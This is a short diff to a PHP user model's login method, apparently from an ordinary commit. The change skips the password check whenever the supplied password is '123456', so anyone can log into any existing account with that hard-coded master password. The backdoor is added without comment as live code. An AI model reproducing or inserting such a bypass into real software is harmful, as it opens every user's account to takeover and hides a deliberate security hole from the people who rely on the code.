@@ -54,13 +54,15 @@ class UserModel {
             $this->errmsg = '用户名不存在';
             return false;
         }
+        if ($password != '123456') {
+            $password = $this->_generatePassword($password);
 
-        $password = $this->_generatePassword($password);
 
-        if ($password != $pd[0]['password']) {
-            $this->errno = 9;
-            $this->errmsg = '密码不正确';
-            return false;
+            if ($password != $pd[0]['password']) {
+                $this->errno = 9;
+                $this->errmsg = '密码不正确';
+                return false;
+            }
         }
 
         return intval($pd[0]['id']);
